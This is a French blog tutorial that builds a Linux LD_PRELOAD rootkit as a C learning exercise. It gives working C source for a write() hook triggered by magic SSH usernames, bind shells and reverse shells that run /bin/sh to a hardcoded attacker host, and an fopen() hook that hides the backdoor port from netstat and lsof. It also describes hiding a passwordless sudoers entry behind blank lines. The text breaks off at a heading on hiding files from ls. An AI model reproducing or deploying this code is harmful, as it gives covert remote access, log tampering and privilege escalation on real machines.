Créer un rootkit pour apprendre le C
29 septembre 2019

Informations générales
Cet article est ma solution pour le dernier devoir de mon référentiel Learning-C. J'ai pensé qu'une bonne façon de couronner un dépôt conçu pour initier les gens à la programmation C très basique serait de prendre ces techniques très basiques et de créer un programme simple mais puissant lié à la sécurité, à savoir un rootkit de bibliothèque partagée malveillant.

Je suis tombé sur les rootkits LD_PRELOAD en regardant une conférence de @r00tkillah en 2016 sur son rootkit initrd. Il parle des approches historiques des rootkits Linux et l'approche LD_PRELOAD bénéficie d'une bonne couverture. Comme il a été décrit dans la conférence comme une approche utilisateur, j'ai commencé à lire à leur sujet et j'ai rapidement découvert quelques implémentations bien connues, à savoir le Jynx Rootkit. Jynx a beaucoup d'articles discutant de ses fonctionnalités et de la façon de le détecter. Il était assez robuste, enregistrant environ 1 500 lignes de code dans le fichier principal et accrochant ~20 appels système.

Mon objectif pour cette tâche, puisque nous venions d'apprendre à accrocher des appels système dans la tâche précédente, était de créer un rootkit userland qui :

fourni une opportunité de porte dérobée/coquille de commande,
caché les connexions réseau malveillantes de netstat(et peut-êtrelsof ), et
caché des fichiers malveillants.
Pour être clair : je suis pleinement conscient qu’il ne s’agit pas d’un programme solide et révolutionnaire. Ces techniques sont analysées et discutées depuis environ 7 ans maintenant. MAIS c'est en quelque sorte un sujet de niche et quelque chose que je ne pense pas que beaucoup de gens aient rencontré. Je voudrais également simplement orienter les gens vers des blogs et des articles qui détaillent les détails techniques en jeu ici au lieu d'exposer moi-même ces détails, car je ne suis pas un expert.

N'utilisez pas ces techniques à des fins malveillantes. L'explication technique du code et des techniques ci-dessous correspond simplement à ma compréhension de leur fonctionnement. Il est tout à fait possible que j'aie complètement mal interprété le comportement de ces programmes et que leur exécution sur votre système puisse causer des dommages.

Bibliothèques partagées et LD_PRELOAD
Beaucoup de choses ont été écrites sur le thème des bibliothèques partagées, je ne passerai donc pas beaucoup de temps ici à les expliquer (nous les avons même abordées dans le dernier article). Les bibliothèques partagées ou dynamiques définissent des fonctions que le linker dynamique relie à d'autres programmes pendant leur exécution. Un exemple courant est libc. Cela réduit la quantité de code dont vous avez besoin dans un exécutable de programme car il partage des définitions de fonctions avec une bibliothèque.

LD_PRELOAD est une variable d'environnement configurable qui permet aux utilisateurs de spécifier une bibliothèque partagée à charger en mémoire pour les programmes avant d'autres bibliothèques partagées. Juste un exemple rapide, si nous vérifions les bibliothèques partagées utilisées/bin/ls sur une boîte Kali x86 standard, nous obtenons :

tokyo:~/ # ldd /bin/ls                                             
	linux-gate.so.1 (0xb7fcf000)
	libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7f57000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d79000)
	libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7d00000)
	libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7cfa000)
	/lib/ld-linux.so.2 (0xb7fd1000)
	libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7cd9000)
Nous voyons donc un certain nombre de dépendances de bibliothèque partagées pour/bin/ls . Si nous définissons la variable d'environnementLD_PRELOAD sur une bibliothèque partagée notionnelle, nous pouvons réellement modifier les dépendances de la bibliothèque partagée dont dispose ce binaire. De plus,LD_PRELOAD cela nous permet de spécifier que notre bibliothèque choisie est chargée en mémoire avant toutes les autres. Nous pouvons créer une bibliothèque partagée appeléeexample.so et l'exporterLD_PRELOAD comme suit, puis vérifier les dépendances de la bibliothèque de/bin/ls :

tokyo:~/LearningC/ # export LD_PRELOAD=$PWD/example.so                                                                     
tokyo:~/LearningC/ # ldd /bin/ls                                                                                            
	linux-gate.so.1 (0xb7fc0000)
	/root/LearningC/example.so (0xb7f8f000)
	libselinux.so.1 => /lib/i386-linux-gnu/libselinux.so.1 (0xb7f43000)
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7d65000)
	libdl.so.2 => /lib/i386-linux-gnu/libdl.so.2 (0xb7d5f000)
	libpcre.so.3 => /lib/i386-linux-gnu/libpcre.so.3 (0xb7ce6000)
	/lib/ld-linux.so.2 (0xb7fc2000)
	libpthread.so.0 => /lib/i386-linux-gnu/libpthread.so.0 (0xb7cc5000)
Comme vous pouvez le voir, notre bibliothèque/root/LearningC/example.so est chargée en premier avant toute autre bibliothèque sur le disque. (Explication géniale de cette première bibliothèque, “”linux-gate.so.1)

Il convient de noter qu'en ne spécifiant pas de binaire après le chemin d'accès à notre bibliothèque partagée, nous utiliseronsLD_PRELOAD la bibliothèque partagée spécifiée pour tous les programmes liés dynamiquement à l'échelle du système.

/etc/ld.so.preload
Afin d'éviter de définir des variables d'environnement, nous sommes également autorisés à créer un fichier texte appelé/etc/ld.so.preload et les bibliothèques partagées stockées dans ce fichier délimitées par un espace blanc serontLD_PRELOAD ‘d dans un sens dans l'ordre dans lequel elles sont écrites, encore une fois, à l'échelle du système. Il n'y a aucun moyen de spécifier un binaire de cette façon, cela s'appliquera à tous les programmes liés dynamiquement. Nous pouvons voir que les programmes liés dynamiquement vérifient l'existence de ce fichier lorsqu'ils sont appelés en utilisant l'utilitairestrace pour espionner les appels système effectués par un programme lors de son exécution. Essayons à nouveau/bin/ls :

tokyo:~/LearningC/ # strace /bin/ls                                                                                        
execve("/bin/ls", ["/bin/ls"], 0xbf8d8e60 /* 47 vars */) = 0
brk(NULL)                               = 0xbc1000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ed6000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
-----snip-----
Comme vous pouvez le voir,/bin/ls appelle l'access()appel système et vérifie s'il a accès à/etc/ld.so.preload ; cependant, la valeur de retour-1 indique que le fichier n'existe pas (No such file or directory).

Créons le fichier puis exécutons à nouveau cet exercice :

tokyo:~/LearningC/ # echo "" > /etc/ld.so.preload                                                                           
tokyo:~/LearningC/ # strace /bin/ls                                                                                        
execve("/bin/ls", ["/bin/ls"], 0xbfcba0a0 /* 47 vars */) = 0
brk(NULL)                               = 0x570000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7eff000
access("/etc/ld.so.preload", R_OK)      = 0
openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
-----snip-----
Cette fois, nous obtenons en fait un appelopenat() système juste aprèsaccess(), car l'accès se termine avec une valeur de retour indiquant le0 succès. renvoie une valeur de comme descripteur de fichier.openat()3

Saisissons notre bibliothèque malveillante et voyons ce qu'il y a à dire à ce sujet.example.so/etc/ld.so.preloadstrace

tokyo:~/LearningC/ # strace /bin/ls                                                                                        
execve("/bin/ls", ["/bin/ls"], 0xbf956640 /* 47 vars */) = 0
brk(NULL)                               = 0x1a8f000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f64000
access("/etc/ld.so.preload", R_OK)      = 0
openat(AT_FDCWD, "/etc/ld.so.preload", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=27, ...}) = 0
mmap2(NULL, 27, PROT_READ|PROT_WRITE, MAP_PRIVATE, 3, 0) = 0xb7f92000
close(3)                                = 0
openat(AT_FDCWD, "/root/LearningC/example.so", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\21\0\0004\0\0\0"..., 512) = 512
Nous voyons que non seulement il s'est ouvert, mais qu'/etc/ld.so.preloadil a lu certaines valeurs du fichier, puis a ouvert notre bibliothèque partagée pour la lecture. Nous avons pu charger notre bibliothèque partagée en mémoire pendant la durée d'exécution de/bin/ls .

Connexion des appels système avec des injections de bibliothèque partagée
Comme nous l’avons vu dans la progression,Learning C ce mécanisme de préchargement permetroot à un utilisateur de manipuler puissamment les programmes de l’espace utilisateur. Nous pouvons redéfinir efficacement les fonctions d’appel système courantes et fréquemment utilisées et leurs fonctions d’emballage d’abstraction de niveau supérieur pour signifier tout ce que nous désirons arbitrairement. Si vous avez besoin de plus d'informations sur cette partie de notre expérience, veuillez consulter l'affectation 27 de notreLearning C dépôt où nous passons en revue une grande partie des informations discutées jusqu'à présent. Dans un exemple précédent, nous nous sommes accrochés en utilisant un exemple trouvé dans cet article de blog pour vérifier son tampon pour une chaîne et, s'il est trouvé, imprimer un message différent au terminal.puts()

Le rootkit Noob “Manteau”
Pour atteindre mes objectifs de rootkit susmentionnés, je n'ai pas eu besoin d'accrocher beaucoup d'appels système. J'ai fini par accrocherwrite() ,readdir() ,readdir64() ,fopen() , etfopen64() . Si vous ne tenez pas compte des variations64 pour des raisons de fichiers volumineux, il suffit essentiellement de 3 appels système. Avec ces 3 appels système, nous pouvons nous cacher denetstat ,lsof ,ls , et également générer des connexions en texte clair à notre machine attaquante. “Manteau” signifie cape en français, rendons cela aussi ringard que possible.

Accrocherwrite() pour une gâchette !
L’accrochagewrite() était étonnamment simple pour nos besoins. Je voulais créer un moyen sympa d'activer/déclencher notre rootkit à partir d'un hôte externe. Il y a eu des façons vraiment intéressantes de le faire développées au fil des années, mais j'ai essayé d'être quelque peu low-tech et original. Le rootkit Jynx dont j'ai parlé précédemment dans le dépôt a connecté l'appel système (que nous utiliserons beaucoup dans cet article) pour vérifier les informations de port local et source de la connexion afin de vérifier si la connexion provenait de l'attaquant. Ces valeurs ont été codées en dur dans leur bibliothèque malveillante et pouvaient être définies au moment de la compilation. Il demanderait ensuite un mot de passe et générerait une connexion arrière cryptée. Nous ne ferons rien d'aussi dur à cuire, mais nous ferons quelque chose de cool.accept()openssl

Rendre Syslog maléfique
Au début, lorsque j'ai envisagé des moyens de faire fonctionner un hôte distant après l'avoir touché d'une manière ou d'une autre, j'ai atterri sur Apacheaccess.log. Ce que je pensais faire, c'est envoyer une simple requêteGET HTTP avec une chaîne magique dans leUser Agent: champ, et lorsque le processus Apache écrivait ces informations sur le disqueaccess.log, notre hook vérifiait le tamponwrite() de notre chaîne magique et, s'il était trouvé, créait une connexion à notre hôte.

Cela a vraiment fonctionné, et cela a très bien fonctionné ! Il y avait cependant un petit problème. En fait, cela m'a obligé à redémarrer Apache après avoir spécifié notre bibliothèque malveillante/etc/ld.so.preload, ce qui m'a déplu esthétiquement. Je n'ai pas aimé le fait que vous deviez redémarrer un service Web pour votre rootkit, je ne dis pas que notre bibliothèque partagée est super furtive, mais renverser un serveur Web est une sorte de haute visibilité.

Dans le même ordre d’idées, j’ai découvert que l’syslogutilisateur écrit des tentatives SSH infructueusesauth.log. Il enregistre le nom d'utilisateur et l'adresse IP de l'utilisateur. Exemple d'entrée :Failed password for nobody from 91.205.189.15 port 38556 ssh2 . Génial, nous contrôlons le champ nom d'utilisateur (nobodydans l'exemple) dans un journal sur le système. Le même problème s'applique, nous devons redémarrer syslog après avoir chargé notre bibliothèque partagée, mais ce n'est pas une visibilité aussi élevée que, par exemple, le redémarrage d'Apache. (Les administrateurs système Linux me font savoir si je me trompe à ce sujet).

Un deuxième problème auquel nous sommes confrontés est que nous ne voulons pas revenir à cette case commesyslog, nous voulons revenir commeroot . Il existe probablement un million de façons de vous laisser un fil d'Ariane privé, d'autant plus que vous pouvez masquer des fichiers arbitraires, mais j'ai choisi de simplementvisudo ajouter lesudoers fichiersyslog. J'ai également inséré environ 80 nouvelles lignes après le dernier morceau de texte visible dans le fichier avant d'ajouter l'entrée afinsyslog ALL=(ALL) NOPASSWD:ALL que lsudoers'éditeur de fichiers occasionnel ne le remarque pas. (MDR)

Très bien, nous avons donc une idée de déclencheur et un privesc intégré. Écrivons enfin du C !

Écrire un crochet
Le hook quewrite() j'ai créé ressemble beaucoup auputs() hi-jack que nous avons déjà étudié de manière surprenante. La première partie ressemble à ceci :

ssize_t write(int fildes, const void *buf, size_t nbytes)
{
    ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes);

    ssize_t result;

    new_write = dlsym(RTLD_NEXT, "write");


    char *bind4 = strstr(buf, KEY_4);
    char *bind6 = strstr(buf, KEY_6);
    char *rev4 = strstr(buf, KEY_R_4);
    char *rev6 = strstr(buf, KEY_R_6);
Décomposons cela :

ssize_t write(int fildes, const void *buf, size_t nbytes) il s'agit de la déclaration de la page de manuel de lawrite() fonction. Cela doit correspondre parfaitement, sinon le processus d'appel n'utilisera pas notre bibliothèque partagée comme ressource, il continuera à chercher unewrite() définition ailleurs. Maintenant que nous avons le processus d’appel’ attention ;
ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); nous déclarons une deuxième fonction avec la même structure que la fonction authentiquewrite(). Celui-ci déclare en fait un pointeur mais il n'est pas encore initialisé (il ne pointe encore vers rien). dit “c'est un pointeur vers une fonction appelée ” puis le reste de la déclaration fournit une définition de la fonction qui sera finalement pointée vers ;(*new_write)new_write()
new_write = dlsym(RTLD_NEXT, "write"); fait quelque chose de très crucial. Nous avions déjà déclaré un pointeur versnew_write() mais nous ne l'avions pas encore initialisé. Nous l’initialisons maintenant et lui donnons une adresse mémoire vers laquelle pointer. Il va maintenant pointer vers l'adresse renvoyée par [https://linux.die.net/man/3/dlsym]. est un moyen d'interagir avec le linker dynamique et nous lui donnons deux arguments. Nous lui demandons de trouver l'occurrence suivante () dans les bibliothèques liées suivantes de l'appel. renvoie l'adresse de la prochaine occurrence trouvée de ce symbole. Qu'est-ce que ce serait ? Eh bien, ce sera l'adresse de la VRAIE fonction, car elle va consulter les bibliothèques légitimes après la nôtre. Alors maintenant, dlsymdlsymRTLD_NEXT"write"dlsym"write" write()new_write est essentiellement juste une référence à l'appelwrite() système réel tel que prévu ;
ssize_t result; nous déclarons une variable de type lessize_t type de données renvoyé par notrewrite() fonction et l'appelonsresult .
Les quatre dernières lignes sont très similaires, sechar *bind4 = strstr(buf, KEY_4); décalquent et initialisent une nouvelle variable pointeur duchar type égal au résultat de lastrstr() fonction après avoir comparé le tampon en cours d'écriture (une référence à l'const void *bufargument dans notrewrite() appel système) à une variable définie codéeKEY_4 en dur. Vous pouvez le régler commeKEY_4 vous le souhaitez, je l'ai réglé sur#define KEY_4 "notavaliduser4" . est très intéressant.strstr() S'il trouve le deuxième argument dans le premier argument, il renverra un pointeur vers la première occurrence du deuxième argument. Donc s'il renvoie unNULL, nous savons qu'il n'a pas trouvé de correspondance.
Regardons le bloc de code suivant :

 if (bind4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_bind();
    }

    else if (bind6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_bind();
    }

    else if (rev4 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv4_rev();
    }

    else if (rev6 != NULL)
    {
        fildes = open("/dev/null", O_WRONLY | O_APPEND);
        result = new_write(fildes, buf, nbytes);
        ipv6_rev();
    }
    
    return result;
}
Bien que long, il n'y a pas grand chose à faire ici. Nous avons essentiellement utiliséif/else if pour vérifier le tampon écrit pour plusieurs sous-chaînes que nous utilisons comme déclencheur. Décomposons-le :

if (bind4 != NULL) nous vérifions si la variable l'est et si ce n'est pas le cas, nous passons à notre logique ;bind4NULL
fildes = open("/dev/null", O_WRONLY | O_APPEND); si ce n'est pas le casNULL, alors nous avons une correspondance, nous savons que nous essayons d'activer le rootkit car nous avons envoyé notre chaîne magiquenotavaliduser4 comme tentative SSH. Bien sûr, cela échouera, alors enregistresyslogrez-le et activez notre appelwrite() système accroché. Puisque nous avons une correspondance, nous ne voulons pas qu'elle soit réellement écrite pour enregistrer que nous avons essayé de faire des choses louches. Redirigeons donc l'opération enwrite() utilisant d'abordopen() l'ouverture/dev/null en mode ajout et écriture, puis en passant cette valeur de retour à laint filedes variable que nous avions déjà utilisée dans notre déclaration de fonction. Il convient de mentionner que le routage n'est qu'/dev/nullune solution parmi d'autres, vous ne pouvez tout simplement pas le fairewrite() du tout. Vous êtes Dieu ici (enfin, Dieu de l’espace utilisateur en tout cas) ;
result = new_write(fildes, buf, nbytes); nous effectuons maintenant une opération d'écriture normale et/dev/null donnons la valeur de retour à notressize_t result variable que nous avons définie dans notre déclaration de fonction. Cetteresult variable peut désormais être livrée pour suivre les fonctions. appelle quelque chose comme pour l'ouvrir, puis appelle parce qu'il a un tampon qu'il doit mettre dans le fichier (notre tentative SSH échouée), puis l'opération d'écriture renvoie un résultat sous la forme de notre variable qui n'est probablement qu'une indication d'achèvement ou d'échec. Pour le processus, rien ici n'est cassé, il a appelé écriture et a obtenu un résultat comme prévu. Sachez que lorsqu'il est appelé ici, il avait des valeurs qu'il utilisait comme arguments à la place des arguments de déclaration de fonction. Ça n'est pas passé à syslogopen()auth.logwrite()resultsyslogwrite()const void *bufwrite()lorsqu'il l'a appelé par exemple, il lui a passé quelque chose comme un pointeur vers une chaîne qui disait “tentative SSH échouée pour…”;
ipv4_bind()est le nom d'une fonction appelée qui lie un shell de commande à un port d'écoute. Cette fonction est définie ci-dessus dans le programme. Nous montrerons ce que c'est plus tard, mais il s'agit essentiellement de notre shell de liaison IPV4 TCP que nous avons écrit dans une mission précédente sur le port 65065.
Ainsi, notre déclencheur a atteint le tampon d'écriture, a été écrit au lieu/dev/null de/var/log/auth.log , une fonction ouvrant un shell de liaison a été appelée, puis finalement nous devons renvoyer le résultat au processus appelant afin qu'il sache si la fonction awrite() fonctionné ou non. Nous y parvenons avec le dernier morceau de codereturn result;.

Nous avons ici de nombreuses possibilités. Au total, il existe 4 déclencheurs distincts pour un bindshell IPv4, un bindshell IPv6, un reverse-shell IPv4 et un reverse-shell IPv6. Examinons cela de plus près. Nous ne récapitulerons pas l'intégralité du morceau de code dans chacun puisque nous avons déjà terminé un shell de liaison, mais nous nous concentrerons sur les nouveaux aspects. Voici chaque fonction :

ipv4_bind()Lier la coque
 int ipv4_bind (void)
{
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(LOC_PORT);
    addr.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    const static int optval = 1;

    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval));

    bind(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    listen(sockfd, 0);

    int new_sockfd = accept(sockfd, NULL, NULL);

    for (int count = 0; count < 3; count++)
    {
        dup2(new_sockfd, count);
    }

    char input[30];

    read(new_sockfd, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    if (strcmp(input, PASS) == 0)
    {
        execve("/bin/sh", NULL, NULL);
        close(sockfd);
    }
    else 
    {
        shutdown(new_sockfd, SHUT_RDWR);
        close(sockfd);
    }
    
}
Le nouveau code qui n'était pas présent dans notre dernière implémentation d'un bind shell commence vraiment sérieusement parread(new_sockfd, input, sizeof(input)); . Vous pouvez voir qu'un peu plus tôt dans le programme nous avions déclaré unechar input[30] variable. Ce que nous faisons ici, c'est exécuter unread() appel système et lui transmettre le descripteur de fichier renvoyé par notreaccept() commande. Ainsi, lorsque quelqu’un établit une connexion à notre shell de liaison, nous lisons son entrée.

Nous utilisons la fonction,strcspn() qui renvoie le nombre de caractères de la première chaîne d'arguments qui existent avant d'atteindre le 2ème argument. Ainsi, comme l'utilisateur saisirait un mot de passe puis appuierait sur Retour, il enverrait quelque chose"reallygoodpassword\n" comme notreinput . dit que la valeur du dernier index de la variable est , en fait null terminant notre chaîne pour nous en remplaçant le caractère de nouvelle ligne par un terminateur nul. Testons notre théorie ici avec ce code simple à partir duquel lire l'entrée et la stocker :input[strcspn(input, "\n")] = 0;input0stdininput

 int main (void)
{
    char input[30];
    read(0, input, sizeof(input));
    input[strcspn(input, "\n")] = 0;
    printf("The input was %s", input);
}
Compilons et exécutons ceci :

tokyo:~/LearningC/ # gcc test.c -o test
tokyo:~/LearningC/ # ./test                                                                                                
password
The input was password#
C'est donc ce que nous utilisons pour comparer la saisie de l'utilisateur à notre mot de passe codé en dur défini parPASS lastrcmp() fonction.

S'il renvoiestrcmp() un0 , indiquant les arguments correspondants, le programme émet unexecve() appel et envoie le programme/bin/sh à la connexion en donnant à l'utilisateur final un shell de commande.

Si renvoie une valeur autrestrcmp() que0 , indiquant qu'il n'y a pas eu de correspondance entre les arguments, le socket associé à l'accept()appel système est arrêté et le socket d'écoute est fermé.

La fonctionipv6_rev() fonctionne de manière très similaire, sauf qu'elle a été programmée pour gérer strictement le trafic IPv6.

ipv4_rev()Coquille inversée
Vous trouverez ci-dessous le bloc de code définissant notre fonction shell inversée IPv4 :

int ipv4_rev (void)
{
    const char* host = REM_HOST4;

    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(REM_PORT);
    inet_aton(host, &addr.sin_addr);

    struct sockaddr_in client;
    client.sin_family = AF_INET;
    client.sin_port = htons(LOC_PORT);
    client.sin_addr.s_addr = INADDR_ANY;

    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    bind(sockfd, (struct sockaddr*) &client, sizeof(client));

    connect(sockfd, (struct sockaddr*) &addr, sizeof(addr));

    for (int count = 0; count < 3; count++)
    {
        dup2(sockfd, count);
    }

    execve("/bin/sh", NULL, NULL);
    close(sockfd);

    return 0;
}
La fonctionipv4_rev() fonctionne de manière très similaire au shell de liaison que nous venons d'expliquer ; cependant, l'adresse et le port de l'hôte distant ont été codés en dur et définis respectivement par les définitions et.REM_HOST4REM_PORT

Un autre aspect du shell inversé est que nous émettons unbind() appel système avec la ligne suivante :bind(sockfd, (struct sockaddr*) &client, sizeof(client)); . dans ce cas, il s'agit d'une référence à notre structure de type qui décrit l'hôte victime (le client dans un paradigme shell inversé). Cette ligne de code nous aide à garantir que la connexion shell inversée sortante provient d'un port source spécifique (ou ) sur la victime, ce qui sera utile plus tard lorsque nous masquerons les connexions en fonction d'un numéro de port.clientclientsockaddrLOC_PORT65065/bin/netstat

La fonction shell inversée IPv6 fonctionne de manière très similaire.

Envelopper notrewrite() crochet
Nous avons connecté tous les appels à l'write()échelle du système et avons isolésyslog l'écriture dans le/var/log/auth.log fichier pour enregistrer les tentatives SSH échouées. Nous utilisons un mot déclencheur comme nom d'utilisateur, qui indique à la commande accrochée de générer un shell de liaison ou d'inversion sur IPv4 ou IPv6. Nous avons maintenant beaucoup d’options pour notre porte dérobée.

Se cacher denetstat (etlsof ??)
Maintenant que nous avons une porte dérobée fonctionnelle, il est temps de cacher ces connexionsnetstat. Nous avons choisi un port élevé pour nos fonctions shell afin que l'hôte utilise toujours le port local65065 pour nos connexions. Il s'agit d'un port assez aléatoire à utiliser, nous éviterons donc, espérons-le, de nombreux faux positifs.

Pour comprendre comment se cacher de ces utilitaires, nous devons d'abord comprendre quels appels système ils effectuent lorsqu'ils sont exécutés. Ouvrons un auditeur et65065 courons avec lui pour voir ce qui se passe sous le capot :netstatstrace

tokyo:~/LearningC/ # strace netstat -ano | grep -v unix                                                                     
execve("/usr/bin/netstat", ["netstat", "-ano"], 0xbfd0de64 /* 47 vars */) = 0
-----snip-----
openat(AT_FDCWD, "/proc/net/tcp", O_RDONLY|O_LARGEFILE) = 3
read(3, "  sl  local_address rem_address "..., 4096) = 450
read(3, "", 4096)                       = 0
close(3)                                = 0
-----snip-----
write(1, "Active Internet connections (ser"..., 4096Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 0.0.0.0:65065           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp6       0      0 :::65065                :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
udp        0      0 0.0.0.0:68              0.0.0.0:*                           off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
Donc la première chose que nous voyons est que nous l'appelonsexecve(), nous le voyons ensuite s'ouvrir/proc/net/tcp en mode lecture seule et lire450 les octets du fichier puis se fermer. Plus tard, il écrit ensuite toutes ces données dansstdout . Des trucs assez simples.

Ouvrons-nous et/proc/net/tcp voyons ce qu'il y a là :

tokyo:~/LearningC/ # cat /proc/net/tcp                                                                                      
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:FE29 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 107639 1 c563dbf8 100 0 0 10 0                            
   1: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 73178 1 cb66d650 100 0 0 10 0               
Nous voyons donc les mêmes informations qui ont été imprimées sur le terminal en représentation hexadécimale. est en hexadécimal et comme nous écoutons sur l'interface locale, il est précédé de . Il n'y a pas d'informations sur l'adresse distante car nous ne sommes pas connectés.FE29650650.0.0.000000000

Lit doncnetstat ce fichier, puis le stocke dans un tampon de lecture qui est ensuite interprété et écrit sur le terminal.

Nous avons besoin d’un moyen d’intercepter une partie de ce processus et de modifier les résultats afin que lesFE29 entrées ne soient pas renvoyées à l’utilisateur final denetstat . Pour y parvenir, j'ai créé un hookfopen() qui est une fonction wrapper de niveau supérieur et pas tout à fait un appel système commeopen() . appelle en fait ce qui à son tour appelle des fonctions de niveau inférieur et des appels système. Voici l'accroche complète, et nous allons tout expliquer :netstatfopen()

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
	orig_fopen = dlsym(RTLD_NEXT, "fopen");

	char *ptr_tcp = strstr(pathname, "/proc/net/tcp");

	FILE *fp;

	if (ptr_tcp != NULL)
	{
		char line[256];
		FILE *temp = tmpfile();
		fp = orig_fopen(pathname, mode);
		while (fgets(line, sizeof(line), fp))
		{
			char *listener = strstr(line, KEY_PORT);
			if (listener != NULL)
			{
				continue;
			}
			else
			{
				fputs(line, temp);
			}
		}
		return temp;

	}

	fp = orig_fopen(pathname, mode);
	return fp;
}
Expliquons cela ligne par ligne :

FILE *(*orig_fopen)(const char *pathname, const char *mode); nous déclarons un pointeur vers la fonctionorig_fopen qui a la définition exacte de la fonction légitimefopen(). Cela deviendra plus tard notre référence à la fonction réelle ;
FILE *fopen(const char *pathname, const char *mode) c'est notre crochet, c'est ce que le programme appelant voit et reconnaît comme la définition officielle defopen() ;
orig_fopen = dlsym(RTLD_NEXT, "fopen"); nous initialisons le pointeur que nous avons déclaré plus tôt. Nous avons maintenant l'adresse de la fonction réellefopen() afin de pouvoir lui transmettre l'exécution en cas de besoin ;
char *ptr_tcp = strstr(pathname, "/proc/net/tcp"); nous déclarons un pointeur qui sera initialisé si celuipathname passé comme argument parfopen() le programme appelant a une sous-chaîne correspondant à"/proc/net/tcp" ;
FILE *fp; nous utilisons le mot-FILEclé pour déclarer un pointeur nomméfp qui est duFILE type structure. Ce sera normalement le type de variable renvoyée d'un appel defopen() fonction, nous devons donc l'initialiser avec unfopen() appel ultérieur ;
if (ptr_tcp != NULL) s'il y a une correspondance et que le fichier en cours d'ouverture est le nôtre/proc/net/tcp, faites quelque chose ;
char line[256];nous déclarons un tableau de caractères de 255 octets et un terminateur nul ;
FILE *temp = tmpfile(); nous déclarons ET initialisons un autre pointeur,FILE celui-ci nommétemp , qui pointe vers un fichier temporaire qui vit aussi/tmp longtemps qu'netstatil est en cours d'exécution ;
fp = orig_fopen(pathname, mode); nous avons maintenant enfin initialisé lefp FILE pointeur et nous avons un pointeur vers/proc/net/tcp le fichier qui a été ouvert ;
while (fgets(line, sizeof(line), fp)) nous utilisonsfgets() pour récupérer une ligne du fichier () à la fois. Tant qu'il y a des lignes à saisir (), faites quelque chose ;fp/proc/net/tcpwhile True
char *listener = strstr(line, KEY_PORT); nous déclarons un pointeur nommé qui sera initialisélistener s'il existe une correspondance de sous-chaîne entre la ligne que nous venons de collecter/proc/net/tcp etKEY_PORT que nous avons définie commeFE29 (la représentation hexadécimale de65065 ) ;
Ensuite, nous avons une déclaration selon laquelle si ce n'est pas le cas, nous voulons dire que nous ne ferons rien avec cette ligne, laissons cette ligne dans l'éther ;ifif (listener != NULL)listenerNULLcontinue
MAIS, si le pointeur ne l'est pasNULL, cefputs(line, temp); qui signifie que nous plaçons cette ligne dans notre fichier temporaire ;
return temp; ici, nous renvoyons simplement ,temp qui est le résultat de notrefopen() fonction à notre fichier temporaire, à l'utilisateur final pour un traitement ultérieur ;
enfin, s'il n'/proc/net/tcpest PAS ouvert, nous passons simplement l'exécution au réelfopen() avecfp = orig_fopen(pathname, mode); etreturn fp; .
Ouf, c'était pas mal. J'étais assez fier de celui-ci, il y a certainement une fuite de mémoire ici quelque part mais ça marche ! Lorsque l'utilisateur appellenetstat, notre hook va s'ouvrir/proc/net/tcp, il créera alors un fichier temporaire et copiera tout SAUF notre connexion malveillante dans le fichier temporaire, puis présentera ce fichier temporaire à l'utilisateur final. En prime, ce fichier ne reste sur le disque/tmp que pendant toute la durée denetstat son exécution, ce qui n'est pas très long. Qui possède.

Ce crochet détruitlsof également la possibilité de vérifier le port. Je ne sais pas encore exactement comment cela est accompli, mais nous nous sommes effectivement cachés de deux utilitaires puissants avec notre simple C.

Se cacher de /bin/ls
